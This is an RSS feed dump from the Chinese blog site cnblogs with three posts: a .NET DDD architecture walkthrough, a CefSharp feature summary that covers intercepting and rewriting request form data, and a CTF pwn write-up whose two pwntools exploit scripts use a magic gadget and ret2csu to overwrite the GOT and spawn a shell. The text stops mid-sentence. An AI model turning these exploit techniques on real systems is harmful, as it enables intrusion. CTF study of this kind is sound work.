{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "基于NetCorePal Cloud Framework的DDD架构管理系统实践",
      "link": "https://www.cnblogs.com/aishangyipiyema/p/19499381",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/aishangyipiyema/p/19499381\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 22:57\">\n    <span>基于NetCorePal Cloud Framework的DDD架构管理系统实践</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"基于netcorepal-cloud-framework的ddd架构管理系统实践\">基于NetCorePal Cloud Framework的DDD架构管理系统实践</h1>\n<p>前段时间在做一个管理系统的项目，想尝试一下DDD架构在实际项目中的应用。经过一番调研，最终选择了NetCorePal Cloud Framework作为基础框架，结合.NET 10和Vue 3搭建了一套完整的前后端分离架构。今天就想和大家分享一下这个项目的架构设计和技术选型，希望能给正在做类似项目的朋友一些参考。</p>\n<p>项目源码地址：<a href=\"https://github.com/zhouda1fu/Ncp.Admin\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/zhouda1fu/Ncp.Admin</a></p>\n<h2 id=\"项目概述\">项目概述</h2>\n<p>这个项目是一个典型的企业级管理系统，包含了用户、角色、部门等基础功能模块。在技术选型上，采用了目前比较主流的技术栈：</p>\n<p>后端方面，使用.NET 10作为主要框架，配合EF Core做数据访问，FastEndpoints替代传统的Controller，MediatR实现CQRS模式。数据存储支持MySQL、PostgreSQL和SQL Server，消息队列选择了RabbitMQ（通过CAP框架集成），缓存用Redis，还集成了.NET Aspire来做云原生的基础设施管理。</p>\n<p>前端部分基于Vben Admin，这是一个非常优秀的Vue 3 + TypeScript + Vite的管理后台模板，UI组件用的是Ant Design Vue，整体体验不错。</p>\n<h2 id=\"架构设计\">架构设计</h2>\n<h3 id=\"分层架构\">分层架构</h3>\n<p>整个项目采用了经典的三层架构，这个结构应该很多做DDD的朋友都比较熟悉。三层之间的依赖关系是单向的：Web层依赖Infrastructure层，Infrastructure层依赖Domain层，Domain层作为核心，不依赖任何其他层。</p>\n<pre><code>Ncp.Admin\n├── Domain（领域层）\n│   ├── AggregatesModel（聚合模型）\n│   └── DomainEvents（领域事件）\n├── Infrastructure（基础设施层）\n│   ├── EntityConfigurations（实体配置）\n│   └── Repositories（仓储实现）\n└── Web（表现层）\n    ├── Application（应用服务层）\n    │   ├── Commands（命令）\n    │   ├── Queries（查询）\n    │   └── DomainEventHandlers（领域事件处理器）\n    └── Endpoints（API端点）\n</code></pre>\n<p>这种分层的好处是职责清晰，Domain层只关注业务逻辑，Infrastructure层负责技术实现，Web层处理HTTP请求和响应。</p>\n<h3 id=\"核心设计模式\">核心设计模式</h3>\n<h4 id=\"1-领域驱动设计ddd\">1. 领域驱动设计（DDD）</h4>\n<p>在这个项目中，DDD主要体现在聚合根的设计上。每个聚合根都有自己的业务边界，状态只能通过业务方法来修改。就拿部门这个聚合根来说吧：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门ID（强类型ID）\n/// &lt;/summary&gt;\npublic partial record DeptId : IInt64StronglyTypedId;\n\n/// &lt;summary&gt;\n/// 部门聚合根\n/// &lt;/summary&gt;\npublic class Dept : Entity&lt;DeptId&gt;, IAggregateRoot\n{\n    public string Name { get; private set; } = string.Empty;\n    public string Remark { get; private set; } = string.Empty;\n    public DeptId ParentId { get; private set; } = default!;\n    public int Status { get; private set; } = 1;\n    \n   \n    protected Dept() { }\n    \n    // 业务方法：更新部门信息\n    public void UpdateInfo(string name, string remark, DeptId parentId, int status)\n    {\n        Name = name;\n        Remark = remark;\n        ParentId = parentId;\n        Status = status;\n        UpdateTime = new UpdateTime(DateTimeOffset.UtcNow);\n        \n        // 发布领域事件\n        AddDomainEvent(new DeptInfoChangedDomainEvent(this));\n    }\n    \n    // 软删除\n    public void SoftDelete()\n    {\n        if (IsDeleted)\n        {\n            throw new KnownException(\"部门已经被删除\");\n        }\n        IsDeleted = true;\n        UpdateTime = new UpdateTime(DateTimeOffset.UtcNow);\n    }\n}\n</code></pre>\n<p>这里有几个设计点我觉得值得说一下。首先是强类型ID，比如<code>DeptId</code>，这样可以避免把部门ID和用户ID搞混，编译器就能帮你检查出来。其次是属性都用<code>private set</code>，外面不能直接修改，必须通过业务方法，这样就保证了业务规则的一致性。另外，当部门信息变更时会发布领域事件，这样可以通知其他需要同步更新的地方，比如用户表中的部门名称。</p>\n<h4 id=\"2-cqrs模式命令查询职责分离\">2. CQRS模式（命令查询职责分离）</h4>\n<p>CQRS在这个项目中主要体现在读写分离上。写操作通过命令（Command）来处理，读操作通过查询（Query）来处理。这样做的好处是职责清晰，而且可以针对不同的场景做优化。</p>\n<p>写操作这边，命令的定义很简单，就是一个record。每个命令都有对应的验证器和处理器。看一个创建部门的例子：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 创建部门命令\n/// &lt;/summary&gt;\npublic record CreateDeptCommand(string Name, string Remark, DeptId? ParentId, int Status) \n    : ICommand&lt;DeptId&gt;;\n\n/// &lt;summary&gt;\n/// 命令验证器\n/// &lt;/summary&gt;\npublic class CreateDeptCommandValidator : AbstractValidator&lt;CreateDeptCommand&gt;\n{\n    public CreateDeptCommandValidator(DeptQuery deptQuery)\n    {\n        RuleFor(d =&gt; d.Name).NotEmpty().WithMessage(\"部门名称不能为空\");\n        RuleFor(d =&gt; d.Name)\n            .MustAsync(async (n, ct) =&gt; !await deptQuery.DoesDeptExist(n, ct))\n            .WithMessage(d =&gt; $\"该部门已存在，Name={d.Name}\");\n        RuleFor(d =&gt; d.Status).InclusiveBetween(0, 1).WithMessage(\"状态值必须为0或1\");\n    }\n}\n\n/// &lt;summary&gt;\n/// 命令处理器\n/// &lt;/summary&gt;\npublic class CreateDeptCommandHandler(IDeptRepository deptRepository) \n    : ICommandHandler&lt;CreateDeptCommand, DeptId&gt;\n{\n    public async Task&lt;DeptId&gt; Handle(CreateDeptCommand request, CancellationToken cancellationToken)\n    {\n        var parentId = request.ParentId ?? new DeptId(0);\n        var dept = new Dept(request.Name, request.Remark, parentId, request.Status);\n        \n        await deptRepository.AddAsync(dept, cancellationToken);\n        \n        // 注意：不需要手动调用SaveChanges，框架会自动处理\n        return dept.Id;\n    }\n}\n</code></pre>\n<p>验证器这里用了FluentValidation，支持同步和异步验证。比如检查部门名称是否已存在这种需要查数据库的验证，就可以用异步的<code>MustAsync</code>。</p>\n<p>读操作这边，直接使用DbContext，而且可以用投影来优化性能。比如获取部门树的时候，只选择需要的字段：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门查询服务\n/// &lt;/summary&gt;\npublic class DeptQuery(ApplicationDbContext applicationDbContext) : IQuery\n{\n    private DbSet&lt;Dept&gt; DeptSet { get; } = applicationDbContext.Depts;\n    \n    /// &lt;summary&gt;\n    /// 获取部门树（使用投影优化性能）\n    /// &lt;/summary&gt;\n    public async Task&lt;IEnumerable&lt;DeptTreeDto&gt;&gt; GetDeptTreeAsync(\n        bool includeInactive = false, \n        CancellationToken cancellationToken = default)\n    {\n        // 使用投影只选择需要的字段，减少内存占用\n        var allDepts = await DeptSet.AsNoTracking()\n            .WhereIf(!includeInactive, d =&gt; d.Status != 0)\n            .Select(d =&gt; new DeptTreeNode\n            {\n                Id = d.Id,\n                Name = d.Name,\n                Remark = d.Remark,\n                ParentId = d.ParentId,\n                Status = d.Status,\n                CreatedAt = d.CreatedAt\n            })\n            .ToListAsync(cancellationToken);\n        \n        // 在内存中构建树形结构\n        return BuildTreeStructure(allDepts);\n    }\n}\n</code></pre>\n<p>这样读写分离的好处是，查询这边可以针对不同的查询场景做优化，比如用投影减少内存占用，或者将来可以加缓存、用读库等，而不会影响写操作的逻辑。</p>\n<h4 id=\"3-事件驱动架构\">3. 事件驱动架构</h4>\n<p>事件驱动这块，项目实现了领域事件和集成事件两种机制。领域事件主要用于聚合内部的同步操作，集成事件用于跨服务通信。</p>\n<p>比如说，当部门信息变更的时候，需要同步更新用户表中的部门名称。这个过程就可以通过领域事件来实现：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门信息变更领域事件\n/// &lt;/summary&gt;\npublic record DeptInfoChangedDomainEvent(Dept Dept) : IDomainEvent;\n</code></pre>\n<p>然后在事件处理器中处理这个逻辑：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门信息变更领域事件处理器 - 用于更新用户部门名称\n/// &lt;/summary&gt;\npublic class DeptInfoChangedDomainEventHandlerForUpdateUserDeptName(\n    IMediator mediator, \n    UserQuery userQuery) \n    : IDomainEventHandler&lt;DeptInfoChangedDomainEvent&gt;\n{\n    public async Task Handle(DeptInfoChangedDomainEvent domainEvent, CancellationToken cancellationToken)\n    {\n        var dept = domainEvent.Dept;\n        var deptId = dept.Id;\n        var newDeptName = dept.Name;\n        \n        // 查询所有属于该部门的用户ID\n        var userIds = await userQuery.GetUserIdsByDeptIdAsync(deptId, cancellationToken);\n        \n        // 通过Command更新每个用户的部门名称（而不是直接操作数据库）\n        foreach (var userId in userIds)\n        {\n            var command = new UpdateUserDeptNameCommand(userId, newDeptName);\n            await mediator.Send(command, cancellationToken);\n        }\n    }\n}\n</code></pre>\n<p>这样设计的好处是，部门聚合和用户聚合之间没有直接依赖，通过事件来通信。如果将来需要增加新的业务逻辑，比如部门变更时要发送通知，只需要再加一个事件处理器就行了，不需要改现有的代码。</p>\n<h4 id=\"4-fastendpoints轻量级api框架\">4. FastEndpoints轻量级API框架</h4>\n<p>在API设计这块，项目选择了FastEndpoints而不是传统的Controller。主要是觉得FastEndpoints的代码更简洁，性能也更好。一个端点就是一个类，职责清晰。</p>\n<p>看一个创建部门的例子：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 创建部门的API端点\n/// &lt;/summary&gt;\n[Tags(\"Depts\")]\npublic class CreateDeptEndpoint(IMediator mediator) \n    : Endpoint&lt;CreateDeptRequest, ResponseData&lt;CreateDeptResponse&gt;&gt;\n{\n    public override void Configure()\n    {\n        Post(\"/api/admin/dept\");\n        AuthSchemes(JwtBearerDefaults.AuthenticationScheme);\n        Permissions(PermissionCodes.AllApiAccess, PermissionCodes.DeptCreate);\n    }\n    \n    public override async Task HandleAsync(CreateDeptRequest req, CancellationToken ct)\n    {\n        var cmd = new CreateDeptCommand(req.Name, req.Remark, req.ParentId, req.Status);\n        var deptId = await mediator.Send(cmd, ct);\n        var response = new CreateDeptResponse(deptId, req.Name, req.Remark);\n        await Send.OkAsync(response.AsResponseData(), cancellation: ct);\n    }\n}\n</code></pre>\n<p>代码很简洁，一个类就把路由、认证、权限都配置好了。请求和响应都是强类型的，类型安全有保障。而且测试起来也很方便，不需要启动HTTP服务器，直接测端点就行了。</p>\n<h2 id=\"几个核心特性\">几个核心特性</h2>\n<h3 id=\"1-强类型id\">1. 强类型ID</h3>\n<p>这个项目里所有聚合根都用强类型ID，而不是直接用<code>long</code>或<code>int</code>。比如部门ID是<code>DeptId</code>，用户ID是<code>UserId</code>。这样做的好处是编译器能帮你检查类型错误，不会把部门ID和用户ID搞混。</p>\n<p>使用起来也很简单：</p>\n<pre><code class=\"language-csharp\">// 定义强类型ID\npublic partial record DeptId : IInt64StronglyTypedId;\n\n// 使用强类型ID\nvar deptId = new DeptId(123);\nvar parentId = request.ParentId ?? new DeptId(0);\n</code></pre>\n<p>框架会自动处理序列化和类型转换，用起来很顺手。</p>\n<h3 id=\"2-仓储模式\">2. 仓储模式</h3>\n<p>仓储这块，写操作通过仓储来处理，查询操作直接使用DbContext。仓储的实现很简单：</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// 部门仓储接口\n/// &lt;/summary&gt;\npublic interface IDeptRepository : IRepository&lt;Dept, DeptId&gt; { }\n\n/// &lt;summary&gt;\n/// 部门仓储实现\n/// &lt;/summary&gt;\npublic class DeptRepository(ApplicationDbContext context) \n    : RepositoryBase&lt;Dept, DeptId, ApplicationDbContext&gt;(context), \n      IDeptRepository { }\n</code></pre>\n<p>框架会自动管理事务和SaveChanges，命令处理器里不需要手动调用，这样代码更简洁，也不容易出错。</p>\n<h3 id=\"3-验证机制\">3. 验证机制</h3>\n<p>验证用的是FluentValidation，支持同步和异步验证。比如创建部门的时候，需要检查部门名称是否已存在，就可以用异步验证：</p>\n<pre><code class=\"language-csharp\">public class CreateDeptCommandValidator : AbstractValidator&lt;CreateDeptCommand&gt;\n{\n    public CreateDeptCommandValidator(DeptQuery deptQuery)\n    {\n        RuleFor(d =&gt; d.Name).NotEmpty().WithMessage(\"部门名称不能为空\");\n        // 异步验证：检查部门名称是否已存在\n        RuleFor(d =&gt; d.Name)\n            .MustAsync(async (n, ct) =&gt; !await deptQuery.DoesDeptExist(n, ct))\n            .WithMessage(d =&gt; $\"该部门已存在，Name={d.Name}\");\n    }\n}\n</code></pre>\n<h3 id=\"4-异常处理\">4. 异常处理</h3>\n<p>业务异常用<code>KnownException</code>来处理，框架会自动转换成合适的HTTP状态码。比如在聚合根里：</p>\n<pre><code class=\"language-csharp\">// 在聚合根中\npublic void SoftDelete()\n{\n    if (IsDeleted)\n    {\n        throw new KnownException(\"部门已经被删除\");\n    }\n    // ...\n}\n\n// 在命令处理器中\nvar dept = await deptRepository.GetAsync(request.DeptId, cancellationToken) \n    ?? throw new KnownException($\"未找到部门，DeptId = {request.DeptId}\");\n</code></pre>\n<p>这样前端收到的错误信息就很清晰，不需要再做额外的转换。</p>\n<h2 id=\"测试策略\">测试策略</h2>\n<p>测试这块，项目用的是xUnit，集成测试用了Aspire来自动管理测试环境。这样做的好处是不用手动搭建测试数据库、Redis这些基础设施，Aspire会自动启动和管理。</p>\n<p>看一个部门创建接口的测试例子：</p>\n<pre><code class=\"language-csharp\">[Collection(WebAppTestCollection.Name)]\npublic class DeptTests(WebAppFixture app) : AuthenticatedTestBase&lt;WebAppFixture&gt;(app)\n{\n    [Fact]\n    public async Task CreateDept_WithValidData_ShouldSucceed()\n    {\n        // Arrange\n        var client = await GetAuthenticatedClientAsync();\n        var deptName = $\"测试部门_{Guid.NewGuid():N}\";\n        \n        try\n        {\n            // Act\n            var request = new CreateDeptRequest(deptName, \"测试备注\", null, 1);\n            var (response, result) = await client.POSTAsync&lt;\n                CreateDeptEndpoint, \n                CreateDeptRequest, \n                ResponseData&lt;CreateDeptResponse&gt;&gt;(request);\n            \n            // Assert\n            Assert.True(response.IsSuccessStatusCode);\n            Assert.NotNull(result?.Data);\n            Assert.Equal(deptName, result.Data.Name);\n        }\n        finally\n        {\n            await CleanupTestDataAsync();\n        }\n    }\n}\n</code></pre>\n<p>这种测试方式很接近真实的场景，测试的是完整的HTTP请求流程，而且会自动清理测试数据，保证测试之间的独立性。另外还支持身份认证测试，可以模拟登录用户的各种操作。</p>\n<h2 id=\"前端架构\">前端架构</h2>\n<p>前端用的是Vben Admin这个模板，这是一个基于Vue 3的管理后台框架。技术栈也比较主流：Vue 3 Composition API、TypeScript、Vite、Ant Design Vue，状态管理用Pinia，路由用Vue Router。</p>\n<p>Vben Admin这个框架做得很完善，开箱即用的功能很多。比如权限控制，支持路由权限和按钮权限，用起来很方便。还有国际化支持，可以多语言切换。主题和布局也可以定制，基本的管理后台需求都能满足。</p>\n<p>最重要的是类型安全，前后端都用了TypeScript，接口定义好之后，类型检查能帮你发现很多问题。</p>\n<h2 id=\"开发规范\">开发规范</h2>\n<p>为了让代码质量更统一，项目里制定了一些开发规范。比如文件的组织方式：</p>\n<ul>\n<li>聚合根放在 <code>Domain/AggregatesModel/{AggregateName}Aggregate/</code></li>\n<li>领域事件放在 <code>Domain/DomainEvents/</code></li>\n<li>仓储放在 <code>Infrastructure/Repositories/</code></li>\n<li>命令放在 <code>Web/Application/Commands/{Module}Commands/</code></li>\n<li>查询放在 <code>Web/Application/Queries/</code></li>\n<li>端点放在 <code>Web/Endpoints/{Module}Endpoints/</code></li>\n</ul>\n<p>还有一些强制性的要求，比如所有聚合根都用强类型ID，而且不手动赋值ID，依赖EF的值生成器。所有命令都要有对应的验证器。领域事件要在聚合发生改变时发布。命令处理器不能调用SaveChanges，框架会自动处理。仓储必须用异步方法。业务异常用KnownException处理。</p>\n<p>另外，项目还提供了很多代码片段，可以快速生成常用代码。比如<code>ncpcmd</code>可以生成命令及其验证器和处理器，<code>ncpar</code>可以生成聚合根，<code>ncprepo</code>可以生成仓储接口和实现，<code>epp</code>可以生成FastEndpoint的完整实现。这样开发效率会高不少。</p>\n<h2 id=\"云原生支持\">云原生支持</h2>\n<p>项目集成了.NET Aspire，这个功能真的很方便。启动开发环境只需要运行AppHost项目，Aspire会自动管理所有依赖服务，不需要手动启动数据库、Redis、RabbitMQ这些。</p>\n<pre><code class=\"language-bash\"># 仅需确保Docker环境运行\ndocker version\n\n# 直接运行AppHost项目，Aspire会自动管理所有依赖服务\ncd src/Ncp.Admin.AppHost\ndotnet run\n</code></pre>\n<p>Aspire会自动启动和管理数据库容器（MySQL、PostgreSQL等）、消息队列容器（RabbitMQ等）、Redis容器，还会提供统一的Aspire Dashboard界面，可以查看所有服务的状态。服务之间的连接字符串也会自动配置，省了很多麻烦。</p>\n<h2 id=\"代码分析可视化\">代码分析可视化</h2>\n<p>框架还提供了代码流分析和可视化功能，这个对理解架构很有帮助。可以通过命令行工具生成HTML文件：</p>\n<pre><code class=\"language-bash\"># 安装全局工具\ndotnet tool install -g NetCorePal.Extensions.CodeAnalysis.Tools\n\n# 生成可视化文件\ncd src/Ncp.Admin.Web\nnetcorepal-codeanalysis generate --output architecture.html\n</code></pre>\n<p>支持生成架构流程图、命令链路图、事件流程图、类图等，可以直观地看到代码之间的关系和数据流向。</p>\n<h2 id=\"总结\">总结</h2>\n<p>这个项目算是一个DDD架构的实践案例，展示了如何在.NET 10生态中应用DDD、CQRS、事件驱动这些架构思想。整体架构清晰，职责分明，代码组织得也比较规范。</p>\n<p>技术栈上，后端用.NET 10 + EF Core + FastEndpoints + MediatR，前端用Vue 3 + TypeScript + Vite，都是目前比较主流的技术。开发体验上，有代码片段、自动化工具，还有完善的开发规范，开发效率还可以。</p>\n<p>可维护性这块，代码分层清晰，测试支持也比较完善，还有代码可视化工具，方便新人理解架构。云原生支持也很到位，Aspire让基础设施管理变得简单。</p>\n<p>如果你也在做类似的管理系统，或者想了解DDD在实际项目中的应用，可以看看这个项目的代码，应该能有一些参考价值。项目地址在<a href=\"https://github.com/zhouda1fu/Ncp.Admin\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/zhouda1fu/Ncp.Admin</a>，欢迎交流讨论。</p>\n<h2 id=\"参考资料\">参考资料</h2>\n<p>最后附上一些相关的参考资料，有兴趣的朋友可以深入了解一下：</p>\n<ul>\n<li><a href=\"https://github.com/netcorepal/netcorepal-cloud-framework\" rel=\"noopener nofollow\" target=\"_blank\">NetCorePal Cloud Framework</a> - 项目使用的基础框架</li>\n<li><a href=\"https://fastendpoints.com/\" rel=\"noopener nofollow\" target=\"_blank\">FastEndpoints</a> - 轻量级API框架</li>\n<li><a href=\"https://github.com/vbenjs/vue-vben-admin\" rel=\"noopener nofollow\" target=\"_blank\">Vben Admin</a> - 前端管理后台模板</li>\n<li><a href=\"https://learn.microsoft.com/dotnet/aspire/\" rel=\"noopener nofollow\" target=\"_blank\">.NET Aspire</a> - 云原生应用开发平台</li>\n</ul>\n<p>项目源码地址：<a href=\"https://github.com/zhouda1fu/Ncp.Admin\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/zhouda1fu/Ncp.Admin</a></p>\n<hr />\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 22:57</span>&nbsp;\n<a href=\"https://www.cnblogs.com/aishangyipiyema\">红泥巴煮雪</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Wpf使用CefSharp浏览器组件使用的一些总结",
      "link": "https://www.cnblogs.com/HelloQLQ/p/19499427",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/HelloQLQ/p/19499427\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 22:52\">\n    <span>Wpf使用CefSharp浏览器组件使用的一些总结</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<div>1、Cef是谷歌内核的浏览器组件，输入网页地址或本地文件地址，都能解析网页，脚本，css，cookie等，配合flash的dll组件，还能加载flash。</div>\n<div>&nbsp;</div>\n<div>2、它具备按F12启动调试控制台的全部功能。</div>\n<div>&nbsp;</div>\n<div>3、它还可以配置代理，但是这个代理只能对浏览器地址栏上的地址进行代理，无法对网页内部的请求进行代理。</div>\n<div>&nbsp;</div>\n<div>4、它可以注册拦截请求的Handler，任何请求，无论是地址栏还是网页内部的请求，它都可以进行中间拦截，并且在拦截的请求里能访问到一些有用的</div>\n<div>信息，包括头部，提交的数据，访问的url，但是不能修改原始请求的请求url和提交的数据。</div>\n<div>&nbsp;</div>\n<div>5、它可以在内部修改请求的repsonse信息，配合一些拦截请求的Handler，它可以在深度复制原始请求的数据后，并修改原始请求提交的formData数据，</div>\n<div>在这个原始请求还未响应完毕时，内部再使用HttpClient，发送一个新请求，这个新请求只是formData有改变，其他保持跟原始请求一致，然后同步的把</div>\n<div>新请求返回的response返回到原始请求的Response里。这样，虽然无法更改原始请求的请求体，但是通过这种拦截原请求，发起新请求，新响应数据替换</div>\n<div>原始响应数据的方式，达到修改原始请求提交的数据的目的。最终前端无感知的收到正常的响应，保持正常的运行。</div>\n<div>&nbsp;</div>\n<div>6、它能执行当前页面的js脚本里的方法，还可以把C#端的数据，传递给当前页面，比如把C#端的账号密码，自动的填写到网页的窗体里面，并用C#代码控</div>\n<div>制执行网页的登录js脚本方法。</div>\n<div>&nbsp;</div>\n<div>7、它能通过绑定的方式，让前台网页的js方法，执行到C#里面的方法。</div>\n<div>&nbsp;</div>\n<div>8、它不仅有wpf版本的组件可用，也有winform版本的组件可以用。</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 22:52</span>&nbsp;\n<a href=\"https://www.cnblogs.com/HelloQLQ\">HelloLLLLL</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "栈的一个magic gadget的运用以及数组越界",
      "link": "https://www.cnblogs.com/firefly-star/p/19499036",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/firefly-star/p/19499036\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 20:04\">\n    <span>栈的一个magic gadget的运用以及数组越界</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        the end？？？\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<pre><code class=\"language-asm\">.text:0000000000400658                 add     [rbp-3Dh], ebx\n.text:000000000040065B                 nop\n.text:000000000040065C                 retn\n</code></pre>\n<p>这个gadget就比较常见了，就是把ebx的值加给rbp-0x3d内的一个指针解引用后的内容，后面是进行了一个nop不作操作，再后面ret就是继续执行我们栈上的内容，这个主要是要控制rbp与rbx才能实现任意地址写，主要还是利用之前讲过的csu函数去控制这两个寄存器。下面看例题</p>\n<h4 id=\"basectf2024新生赛ezstack\">BaseCTF2024新生赛ezstack</h4>\n<p>先checksec<br />\n<img alt=\"Q3`IZ7H~STBYZ7()8IEVW0J\" class=\"lazyload\" /></p>\n<p>这里只开了nx保护，我们去ida看看<br />\n<img alt=\"Y8`A78$U0FF1LZCL(DAXO4N\" class=\"lazyload\" /></p>\n<p>这里就一个光秃秃的gets栈溢出，什么输出函数都没有。那怎么办呢？这里因为没有全开relro可以打ret2dlresolve，不过这里也有magic gadget<br />\n<img alt=\"@VCEQG%I4)ZKHTJH\" class=\"lazyload\" /></p>\n<p>那这里其实有很多解法了，第一种就是ret2dlresolve（后面我会单独写个文章和延迟绑定机制一起讲），第二种是用magic gadget写got表，写出来一个system函数，直接rop链打完，第三种是因为标准输出也是一个libc库的指针，所以我们也可以写这个，只要我们把他写成一个输出函数，就可以实现泄露libc基址<br />\n<img alt=\"}~Z${Z`MRYU)UE()AU963KW\" class=\"lazyload\" /></p>\n<p>这里其实第一种和第二种都比较看题，如果开了full relro那就不能用了，第三种就比较全一点，没有这个限制。</p>\n<h5 id=\"用magic-gadget改got表解法\">用magic gadget改got表解法</h5>\n<p>这里我们先看第二种，我们先找got表有哪些函数<br />\n<img alt=\"JN17UWAK26TT_0B\" class=\"lazyload\" /></p>\n<p>这里有两个函数，随便写哪个都一样，我们写gets看看，先找出gets和system在libc的偏移<br />\n<img alt=\"DI6441H9(178_7((DD2I4R\" class=\"lazyload\" /></p>\n<p>我们只需要把0x80520+某个数让它=0x50d70，我们这里很显然注意到这里要用补码，我们直接算一下就知道答案是0xFFFFFFFFFFFD0850所以这里就很简单了，我们只需要控制rbx是0xFFFFFFFFFFFD0850，rbp是gets的got表的地址+0x3d就写完了，完整exp如下</p>\n<pre><code>from pwn import *\nimport sys\n#context.log_level='debug'\ncontext.arch='amd64'\nflag = 1\nelf=ELF('./pwn')\nlibc = ELF('./libc.so.6')\nif flag:\n    p = remote('challenge.imxbt.cn',32689)\nelse:\n    p = process('./pwn')\nsa = lambda s,n : p.sendafter(s,n)\nsla = lambda s,n : p.sendlineafter(s,n)\nsl = lambda s : p.sendline(s)\nsd = lambda s : p.send(s)\nrc = lambda n : p.recv(n)\nru = lambda s : p.recvuntil(s)\nti = lambda : p.interactive()\ndef csu(rbx,rbp,got,rdi,rsi,rdx):\n\tpay=p64(0)+p64(rbx)+p64(rbp)+p64(got)+p64(rdi)+p64(rsi)+p64(rdx)\n\treturn pay\ndef dbg():\n    gdb.attach(p)\n    pause()\nmagic=0x400658\ncsugo=0x4006D0\ncsuin=0x4006E6\nrdi=0x4006f3\ngets=elf.got['gets']\ntarget=0x601018\nret=0x4006F4\nsystem=elf.plt['gets']\nget=elf.sym['gets']\npay=0x10*b'b'+flat(rdi,elf.bss()+0x50,get)+p64(csuin)+csu(0xFFFFFFFFFFFD0850,target+0x3d,0,0,0,0)+p64(magic)+flat(ret,rdi,elf.bss()+0x50,system)\nsl(pay)\nsl(b'/bin/sh\\x00')\nti()\n</code></pre>\n<p>效果如下<br />\n<img alt=\")QTV6KVN}9H0SDY_AM9I\" class=\"lazyload\" /></p>\n<h5 id=\"用magic-gadget改bss解法\">用magic gadget改bss解法</h5>\n<p>去改bss也可以，不过有点奇怪，我远程没打通。具体流程是一样的，先从stdin，stdout，stderr里挑一个找他们在libc里的偏移，再找一个输出函数在libc里的偏移。不过因为要泄露libc所以需要两次输入，直接返回main是会报错的，好像是因为io结构体被我们改掉了所以不能直接用gets了，这里选择就是再用一次magic gadget把我们改的io结构再改回去就可以再用gets了往bss写了，写完我们再用两次leave栈迁移过去执行即可（也可以不迁移用ret2csu），然后因为system函数会抬栈，要把gets写入bss的地址写高一点，我打本地的脚本如下</p>\n<pre><code>from pwn import *\nimport sys\n#context.log_level='debug'\ncontext.arch='amd64'\nflag = 1\nelf=ELF('./pwn')\nlibc = ELF('./libc.so.6')\nif flag:\n    p = remote('challenge.imxbt.cn',30415)\nelse:\n    p = process('./pwn')\nsa = lambda s,n : p.sendafter(s,n)\nsla = lambda s,n : p.sendlineafter(s,n)\nsl = lambda s : p.sendline(s)\nsd = lambda s : p.send(s)\nrc = lambda n : p.recv(n)\nru = lambda s : p.recvuntil(s)\nti = lambda : p.interactive()\ndef csu(rbx,rbp,got,rdi,rsi,rdx):\n\tpay=p64(0)+p64(rbx)+p64(rbp)+p64(got)+p64(rdi)+p64(rsi)+p64(rdx)\n\treturn pay\ndef dbg():\n    gdb.attach(p)\n    pause()\nmagic=0x400658\ncsugo=0x4006D0\ncsuin=0x4006E6\nrdi=0x4006f3\ngets=elf.got['gets']\nget=elf.sym['gets']\ntarget=0x601040\nret=0x4006F4\nleave=0x40068C\nbss=0x6011D0+0x800\nrbp=0x400656\npay=0x10*b'b'+p64(csuin)+csu(0xFFFFFFFFFFEF9160,target+0x3d,0,0,0,0)+p64(magic)+p64(csuin)+csu(0,1,target,2,gets,0x20)+p64(csugo)+csu(0x106EA0,target+0x3d,0,0,0,0)+p64(magic)+flat(rdi,bss,get,rbp,bss,leave)+p64(leave)\nsl(pay)\nlibcbase=u64(rc(6).ljust(8,b'\\x00'))-libc.sym['gets']\nprint(hex(libcbase))\nsystem=libcbase+libc.sym['system']\nbinsh=libcbase+next(libc.search(b'/bin/sh'))\npay=flat(0,ret,rdi,binsh,system)\nsl(pay)\nti()\n</code></pre>\n<p>我的版本是glibc2.35，小版本是3.11，远程是glibc2.35小版本是3.8。理论上远程的偏移应该是0xFFFFFFFFFFEF9008，不过我输这个不知道为啥不行，好像是没改成write函数，没有泄露出来。挺奇怪的。不